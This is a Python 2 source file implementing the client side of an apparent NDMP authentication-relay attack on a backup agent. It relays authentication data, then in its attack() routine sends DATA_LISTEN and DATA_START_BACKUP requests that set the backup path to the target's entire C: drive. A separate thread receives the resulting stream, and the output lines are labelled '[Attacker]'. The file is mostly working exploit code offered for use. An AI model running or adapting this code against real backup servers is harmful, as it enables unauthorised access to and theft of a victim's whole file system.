'''
Created on 14-Jan-2010

@author: nibin
'''

import struct
import sys
import socket
import uuid
import random
import xdrlib
 
from dynamic_thread import *
from ndmp import *
import server_ndmp

class client_ndmp():
    
    #addr = ('192.168.1.181',10000)
    
    
    def __init__(self, dsp_nbname, dsp_ip):
        self.__dsp_ip = dsp_ip
        self.__dsp_nbname = dsp_nbname
        self.__sock_client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)        
        self.__sock_client.connect((self.__dsp_ip,10000))
        self.ndmp_pkt = None
        
        print "[*] Client Socket connected!!!"
        recv_data = self.__sock_client.recv(1024) # For the fucking NOTIFY_CONNECTED
        print "[*] Check for NOTIFY_PKT"
        self.print_data(recv_data)
        ndmp_pkt2 = self.parse_ndmp(recv_data)
        
    def print_data(self,data,PRINT=False):
        if PRINT:
            for x in  range(0,len(data)):
              if x%8 ==0:
                  print
              print "0x%02x" % struct.unpack("<B",data[x]),
            print        
    
    def parse_ndmp(self,data):
      temp = ndmp()
      a_obj = temp.parse(data)
      DEBUG= True
      if DEBUG:
        print "Debug---------"
        print "Sequence : 0x%08x" % a_obj.__getitem__('sequence')
        print "Message_Name : 0x%08x" % a_obj.__getitem__('message_name')
        print "Message_Type : 0x%08x" % a_obj.__getitem__('message_type')
        print "Reply_Sequence : 0x%08x" % a_obj.__getitem__('reply_sequence')
        print "Error : 0x%08x" % a_obj.__getitem__('err')
        
        #print a_obj.__getitem__('message_name')[0]
        print "Debug_ends"
      
      return a_obj
      
      
    def pre_run(self):
        
        a_pkt = ndmp()
        print "[*] Sending CONNECT_OPEN reqst to client"
        a_pkt.pkt.__setitem__('message_name',int(0x900))
        #a_pkt.pkt.__setitem__('data',"\x00\x00\x00\x04") #Version 4
        a_pkt.pkt.__setitem__('data',"\x00\x00\x00\x03") #Version: 3
        q = a_pkt.dump()
        send_data =  struct.pack(">L",len(q)+0x80000000)+q
        self.print_data(send_data)
        self.parse_ndmp(send_data)
        self.__sock_client.send(send_data)  
        recv_data = self.__sock_client.recv(1024)
        self.print_data(recv_data)
        self.ndmp_pkt = self.parse_ndmp(recv_data)
        if self.ndmp_pkt.__getitem__('message_name')[0] ==int(0x900):
          print "[*] CONNECT_OPEN Reply received"
        else:
          print "[*] Other Types: Need to work on..might be error.."
          print "Message : 0x%08x" % self.ndmp_pkt.__getitem__('message_name')
        
        b_pkt = ndmp()
        print "[*] Sending CONFIG_GET_AUTH_ATTR rqst to client"
        b_pkt.pkt.__setitem__('message_name',int(0x103))
        b_pkt.pkt.__setitem__('sequence',self.ndmp_pkt.__getitem__('sequence')[0])  #Copying the seq from the reply
        b_pkt.pkt.__setitem__('data',"\x00\x00\x00\xbe")  
        q = b_pkt.dump()
        send_data =  struct.pack(">L",len(q)+0x80000000)+q
        self.print_data(send_data)
        self.parse_ndmp(send_data)
        self.__sock_client.send(send_data)  
        
        
        recv_data = self.__sock_client.recv(1024)
        self.print_data(recv_data)
        self.ndmp_pkt = self.parse_ndmp(recv_data)
        if self.ndmp_pkt.__getitem__('message_name')[0] ==int(0x103):
          print "[*] CONFIG_GET_AUTH_ATTR recvd"
          d = self.ndmp_pkt.__getitem__('data')
          print type(self.ndmp_pkt.__getitem__('data'))
          self.print_data(d)
          magic = d[8:]
          
        print "[*****SO FAR SO GOOD*****]"
        #self.shutdown()
        
        return (magic)        
    
    def serv_auth_run(self):
        
        a_pkt = ndmp()
        print "[*] Sending CONNECT_OPEN reqst to client"
        a_pkt.pkt.__setitem__('message_name',int(0x900))
        #a_pkt.pkt.__setitem__('data',"\x00\x00\x00\x04") #Version 4
        a_pkt.pkt.__setitem__('data',"\x00\x00\x00\x03") #Version: 3
        q = a_pkt.dump()
        send_data =  struct.pack(">L",len(q)+0x80000000)+q
        self.print_data(send_data)
        self.parse_ndmp(send_data)
        self.__sock_client.send(send_data)  
        recv_data = self.__sock_client.recv(1024)
        self.print_data(recv_data)
        self.ndmp_pkt = self.parse_ndmp(recv_data)
        if self.ndmp_pkt.__getitem__('message_name')[0] ==int(0x900):
          print "[*] CONNECT_OPEN Reply received"
        else:
          print "[*] Other Types: Need to work on..might be error.."
          print "Message : 0x%08x" % self.ndmp_pkt.__getitem__('message_name')
        
        b_pkt = ndmp()
        print "[*] Sending NDMP_CONNECT_SERVER_AUTH rqst to client"
        b_pkt.pkt.__setitem__('message_name',int(0x903))
        b_pkt.pkt.__setitem__('sequence',self.ndmp_pkt.__getitem__('sequence')[0])  #Copying the seq from the reply
        b_pkt.pkt.__setitem__('data',"\x00\x00\x00\xbe")  
        q = b_pkt.dump()
        send_data =  struct.pack(">L",len(q)+0x80000000)+q
        self.print_data(send_data)
        self.parse_ndmp(send_data)
        self.__sock_client.send(send_data)  
        
        
        recv_data = self.__sock_client.recv(1024)
        self.print_data(recv_data)
        self.ndmp_pkt = self.parse_ndmp(recv_data)
        if self.ndmp_pkt.__getitem__('message_name')[0] ==int(0x903):
          print "[*] NDMP_CONNECT_SERVER_AUTH recvd"
          d = self.ndmp_pkt.__getitem__('data')
          print type(self.ndmp_pkt.__getitem__('data'))
          self.print_data(d)
          #magic = d[8:]
        else:
           print "[*] Other Types: Need to work on..might be error.."
           print "Message : 0x%08x" % self.ndmp_pkt.__getitem__('message_name')
          
        print "[*****SO FAR SO GOOD*****]"
        #self.shutdown()
      
    
    def doubt_run(self,req):
        if req == int(0xf33b):
          a_pkt = ndmp()
          print "[*] Sending 0xf33b rqst to client"
          a_pkt.pkt.__setitem__('message_name',int(0xf33b))
          a_pkt.pkt.__setitem__('sequence',self.ndmp_pkt.__getitem__('sequence')[0])  #Copying the seq from the reply
          a_pkt.pkt.__setitem__('data',"\x00\x00\x00\x00")
          q = a_pkt.dump()
          send_data =  struct.pack(">L",len(q)+0x80000000)+q
          self.print_data(send_data)
          self.parse_ndmp(send_data)
          self.__sock_client.send(send_data)  
          recv_data = self.__sock_client.recv(1024)
          self.print_data(recv_data)
          self.ndmp_pkt = self.parse_ndmp(recv_data)
          if self.ndmp_pkt.__getitem__('message_name')[0] ==int(0xf33b):
            print "[*] 0xf33b Resp recvd"
            d = self.ndmp_pkt.__getitem__('data')
            print type(self.ndmp_pkt.__getitem__('data'))
            self.print_data(d)
            #magic = d[8:]
          
        print "[*****SO FAR SO GOOD Again*****]"
        return (d)
    
    
    def auth_run(self,dt):
        a_pkt = ndmp()
        print "[*] Sending CLIENT_AUTH rqst to client"
        a_pkt.pkt.__setitem__('message_name',int(0x901))
        a_pkt.pkt.__setitem__('sequence',self.ndmp_pkt.__getitem__('sequence')[0])  #Copying the seq from the reply
        a_pkt.pkt.__setitem__('data',dt)
        q = a_pkt.dump()
        send_data =  struct.pack(">L",len(q)+0x80000000)+q
        self.print_data(send_data)
        self.parse_ndmp(send_data)
        self.__sock_client.send(send_data)  
        recv_data = self.__sock_client.recv(1024)
        self.print_data(recv_data)
        self.ndmp_pkt = self.parse_ndmp(recv_data)
        if self.ndmp_pkt.__getitem__('message_name')[0] ==int(0x901):
          print "[*] CLIENT_AUTH Resp recvd from Client"
          d = self.ndmp_pkt.__getitem__('data')
          print type(self.ndmp_pkt.__getitem__('data'))
          self.print_data(d)
          #magic = d[8:]
          
        print "[*****SO FAR SO GOOD Again*****]"
        return (d)
    
    def relay(self,msg,dt):
        a_pkt = ndmp()
        print "[*] Sending %d rqst to client" % msg
        a_pkt.pkt.__setitem__('message_name',msg)
        a_pkt.pkt.__setitem__('sequence',self.ndmp_pkt.__getitem__('sequence')[0])  #Copying the seq from the reply
        a_pkt.pkt.__setitem__('data',dt)
        q = a_pkt.dump()
        send_data =  struct.pack(">L",len(q)+0x80000000)+q
        self.print_data(send_data)
        self.parse_ndmp(send_data)
        self.__sock_client.send(send_data)  
        recv_data = self.__sock_client.recv(1024)
        self.print_data(recv_data)
        self.ndmp_pkt = self.parse_ndmp(recv_data)
        if self.ndmp_pkt.__getitem__('message_name')[0] ==msg:
          print "[*] %d Resp recvd from Client" % msg
          d = self.ndmp_pkt.__getitem__('data')
          print type(self.ndmp_pkt.__getitem__('data'))
          self.print_data(d)
          #magic = d[8:]
        return (d)
        
    def attack(self):        
        
        gen_uuid = "{" + str(uuid.uuid4()) + "}"
        gen_jobname = "Backup %05d" % random.randint(0, 100000)
        
        print "[*] **************" 
        print "[Attacker] Sending Prop [0xf270] to client"
        a_pkt = ndmp()
        a_pkt.pkt.__setitem__('message_name',int(0xf270))
        a_pkt.pkt.__setitem__('sequence',self.ndmp_pkt.__getitem__('sequence')[0])  #Copying the seq from the reply
        
        f = open('prop_reqf270.xdr')
        d = f.read()
        # There are 0xa elements in it. 
        # d[0:4] ?
        # d[4:] - > Variable array  
        u = xdrlib.Unpacker(d[8:])
        
        # Dictionary of key-value pairs for packing later
        dct = {}
        for i in range(0,0xa):
            k = u.unpack_bytes()
            v = u.unpack_bytes()
            dct[k] = v
        
        if(dct.has_key('BE_JOB_ID')):
            dct['BE_JOB_ID'] = gen_uuid
        if(dct.has_key('BE_JOB_NAME')):
            dct['BE_JOB_NAME'] = gen_jobname
        
        p = xdrlib.Packer()
        
        for key in dct.keys():
            p.pack_string(key)
            p.pack_string(dct[key])
        
        a_pkt.pkt.__setitem__('data',"\x00\x00\x00\x0a" +\
                              "\x00\x00\x00\x0a" +\
                              p.get_buffer())
        
        q = a_pkt.dump()
        send_data =  struct.pack(">L",len(q)+0x80000000)+q
        self.parse_ndmp(send_data)
        self.__sock_client.send(send_data)
        recv_data = self.__sock_client.recv(1024)
        self.ndmp_pkt = self.parse_ndmp(recv_data)
        f.close()
        if self.ndmp_pkt.__getitem__('message_name')[0] == int(0xf270):
          print "[Attacker] Resp Prop [0xf270] recvd from Client"
        else:
            print "[Attacker] ! Expected Prop [0xf270] from Client"
            self.print_data(self.ndmp_pkt, True)
        
        
        print "[Attacker] Sending CONFIG_GET_HOST_INFO to client"
        a_pkt = ndmp()
        a_pkt.pkt.__setitem__('message_name',int(0x100))
        a_pkt.pkt.__setitem__('sequence',self.ndmp_pkt.__getitem__('sequence')[0])  #Copying the seq from the reply
        #a_pkt.pkt.__setitem__('data',"\x00\x00\x00\x00")
        q = a_pkt.dump()
        send_data =  struct.pack(">L",len(q)+0x80000000)+q
        self.parse_ndmp(send_data)
        self.__sock_client.send(send_data)
        recv_data = self.__sock_client.recv(1024)
        self.ndmp_pkt = self.parse_ndmp(recv_data)
        if self.ndmp_pkt.__getitem__('message_name')[0] == int(0x100):
          print "[Attacker] Resp CONFIG_GET_HOST_INFO recvd from Client"
        else:
            print "[Attacker] ! Expected CONFIG_GET_HOST_INFO from Client"
            self.print_data(self.ndmp_pkt, True)
        
        print "[Attacker] Sending CONFIG_GET_SERVER_INFO to client"
        a_pkt = ndmp()
        a_pkt.pkt.__setitem__('message_name',int(0x108))
        a_pkt.pkt.__setitem__('sequence',self.ndmp_pkt.__getitem__('sequence')[0])  #Copying the seq from the reply
        #a_pkt.pkt.__setitem__('data',"\x00\x00\x00\x00")
        q = a_pkt.dump()
        send_data =  struct.pack(">L",len(q)+0x80000000)+q
        self.parse_ndmp(send_data)
        self.__sock_client.send(send_data)
        recv_data = self.__sock_client.recv(1024)
        self.ndmp_pkt = self.parse_ndmp(recv_data)
        if self.ndmp_pkt.__getitem__('message_name')[0] == int(0x108):
          print "[Attacker] Resp CONFIG_GET_SERVER_INFO recvd from Client"
        else:
            print "[Attacker] ! Expected CONFIG_GET_SERVER_INFO from Client"
            self.print_data(self.ndmp_pkt, True)
        
        print "[Attacker] Sending MOVER_SET_RECORD_SIZE to client"
        a_pkt = ndmp()
        a_pkt.pkt.__setitem__('message_name',int(0xa08))
        a_pkt.pkt.__setitem__('sequence',self.ndmp_pkt.__getitem__('sequence')[0])  #Copying the seq from the reply
        a_pkt.pkt.__setitem__('data',"\x00\x00\x80\x00")
        q = a_pkt.dump()
        send_data =  struct.pack(">L",len(q)+0x80000000)+q
        self.parse_ndmp(send_data)
        self.__sock_client.send(send_data)
        recv_data = self.__sock_client.recv(1024)
        self.ndmp_pkt = self.parse_ndmp(recv_data)
        if self.ndmp_pkt.__getitem__('message_name')[0] == int(0xa08):
          print "[Attacker] Resp MOVER_SET_RECORD_SIZE recvd from Client"
        else:
            print "[Attacker] ! Expected MOVER_SET_RECORD_SIZE from Client"
            self.print_data(self.ndmp_pkt, True)
        
        print "[Attacker] Sending DATA_LISTEN to client"
        a_pkt = ndmp()
        a_pkt.pkt.__setitem__('message_name',int(0x409))
        a_pkt.pkt.__setitem__('sequence',self.ndmp_pkt.__getitem__('sequence')[0])  #Copying the seq from the reply
        a_pkt.pkt.__setitem__('data',"\x00\x00\x00\x01")
        q = a_pkt.dump()
        send_data =  struct.pack(">L",len(q)+0x80000000)+q
        self.parse_ndmp(send_data)
        self.__sock_client.send(send_data)
        recv_data = self.__sock_client.recv(1024)
        self.ndmp_pkt = self.parse_ndmp(recv_data)
        do_open_data_stream = False
        data_listen_data = "\x00"
        if self.ndmp_pkt.__getitem__('message_name')[0] == int(0x409):
          print "[Attacker] Resp DATA_LISTEN recvd from Client"
          data_listen_data = self.ndmp_pkt.__getitem__('data')
          do_open_data_stream = True
          #print "TCP communication port %d" % self.ndmp_pkt.__getitem__('data')[0]
        else:
            print "[Attacker] ! Expected DATA_LISTEN from Client"
            self.print_data(self.ndmp_pkt, True)
        
        #DATA_START_BACKUP Req
        asa = raw_input("Start debugging at client..hit?")
        if(do_open_data_stream):
            #data_listen_data = self.ndmp_pkt.__getitem__('data')[0]
            #self.print_data(data_listen_data, True)
            attack_ip = ""
            attack_ip = str(struct.unpack(">B", data_listen_data[8:9])[0])
            attack_ip += "." + str(struct.unpack(">B", data_listen_data[9:10])[0])
            attack_ip += "." + str(struct.unpack(">B", data_listen_data[10:11])[0])
            attack_ip += "." + str(struct.unpack(">B", data_listen_data[11:12])[0])
            
            attack_port = struct.unpack(">I", data_listen_data[12:])[0]
            # Can check whether the attack_ip = dsp_ip
            # Not doing it now
            t = dynamic_thread("start_data_client",name="dataclient01",attack_ip=attack_ip
                               , attack_port=attack_port)
            t.start()
            
        print "[Attacker] Sending DATA_START_BACKUP to client"
        
        a_pkt = ndmp()
        a_pkt.pkt.__setitem__('message_name',int(0x401))
        a_pkt.pkt.__setitem__('sequence',self.ndmp_pkt.__getitem__('sequence')[0])  #Copying the seq from the reply
        
        f = open("data_start_bkup_req401.xdr")
        d = f.read()
        u = xdrlib.Unpacker(d[12:])
        
        dct = {}
        for i in range(0,0x14d):
            k = u.unpack_bytes()
            v = u.unpack_bytes()
            dct[k] = v
        
        if(dct.has_key('JOBNAME')):
            dct['JOBNAME'] = gen_jobname
        
        if(dct.has_key('JOB_INSTANCE_GUID')):
            dct['JOB_INSTANCE_GUID'] = gen_uuid
        
        #"\\RevrseEngg.backupserver.ivizindia.com\C:\scite\*.*",s,v0,t0,l0,n0,f0
        if(dct.has_key('FILESYSTEM')):
            dct['FILESYSTEM'] = "\"\\\\" + self.__dsp_nbname + "\\C:\\*.*\",s,v0,t0,l0,n0,f0" 
        
        
        p = xdrlib.Packer()
        data_buf  = "\x00\x00\x00\x04"
        data_buf += "dump"
        data_buf += "\x00\x00\x01\x4d"
        
        # Dictionary keeps unique keys
        
        p.pack_string('USERNAME')
        p.pack_string('')
        
        if(dct.has_key('NOPASSWORD')):
            p.pack_string('NOPASSWORD')
            p.pack_string(dct['NOPASSWORD'])
            dct.pop('NOPASSWORD')
        
        
        if(dct.has_key('USERNAME')):
            p.pack_string('USERNAME')
            p.pack_string(dct['USERNAME'])
            dct.pop('USERNAME')
        
        if(dct.has_key('PASSWORD')):
            p.pack_string('PASSWORD')
            p.pack_string(dct['PASSWORD'])
            dct.pop('PASSWORD')
        
        for key in dct.keys():
            p.pack_string(key)
            p.pack_string(dct[key])
        
        data_buf += p.get_buffer()
        
        
        pkt_full_length = len(data_buf)
        pkt_sent_len = 0
        initialized = False
        PACKET_SIZE_LIMIT = 4000
        while(pkt_sent_len < pkt_full_length):
            #Packet size limit is 4000 bytes
            if(initialized == False):
                # 28 bytes header + 3972 data
                # First packet
                pkt_sent_len = PACKET_SIZE_LIMIT - 28
                a_pkt.pkt.__setitem__('data',data_buf[:pkt_sent_len])
                q = a_pkt.dump()
                send_data =  struct.pack(">L",len(q)+0x00000000)+q
                initialized = True
                print "[*] Sending initial 0x401 packet"                
            else:                
                if((pkt_sent_len + (PACKET_SIZE_LIMIT - 4)) < pkt_full_length ):
                    #interim packets
                    old_pkt_sent_len = pkt_sent_len
                    pkt_sent_len = pkt_sent_len + (PACKET_SIZE_LIMIT - 4)
                    q = data_buf[old_pkt_sent_len:pkt_sent_len]
                    send_data =  struct.pack(">L",len(q)+0x00000000)+q
                    print "[*] Sending interim 0x401 packet"
                else:
                    #last packet
                    q = data_buf[pkt_sent_len:]
                    send_data =  struct.pack(">L",len(q)+0x80000000)+q
                    pkt_sent_len = pkt_full_length
                    print "[*] Sending final 0x401 packet"
                
            self.__sock_client.send(send_data)
        
        f.close()
        recv_data = self.__sock_client.recv(1024)
        self.ndmp_pkt = self.parse_ndmp(recv_data)
        if self.ndmp_pkt.__getitem__('message_name')[0] == int(0x401):
            print "[Attacker] Resp DATA_START_BACKUP recvd from Client"
                #print "TCP communication port %d" % self.ndmp_pkt.__getitem__('data')[0]
        else:
            print "[Attacker] ! Expected DATA_START_BACKUP from Client"
            self.print_data(self.ndmp_pkt, True)
            
        print "[Attacker] Sending DATA_GET_STATE to client"
        a_pkt = ndmp()
        a_pkt.pkt.__setitem__('message_name',int(0x400))
        a_pkt.pkt.__setitem__('sequence',self.ndmp_pkt.__getitem__('sequence')[0])  #Copying the seq from the reply
        #a_pkt.pkt.__setitem__('data',"\x00\x00\x00\x00")
        q = a_pkt.dump()
        send_data =  struct.pack(">L",len(q)+0x80000000)+q
        self.parse_ndmp(send_data)
        self.__sock_client.send(send_data)
        recv_data = self.__sock_client.recv(1024)
        self.ndmp_pkt = self.parse_ndmp(recv_data)
        if self.ndmp_pkt.__getitem__('message_name')[0] == int(0x400):
          print "[Attacker] Resp DATA_GET_STATE recvd from Client"
        else:
            print "[Attacker] ! Expected DATA_GET_STATE from Client"
            self.print_data(self.ndmp_pkt, True)

        print "Reached Stage 2 "  
        
    def shutdown(self):
        self.__sock_client.close()      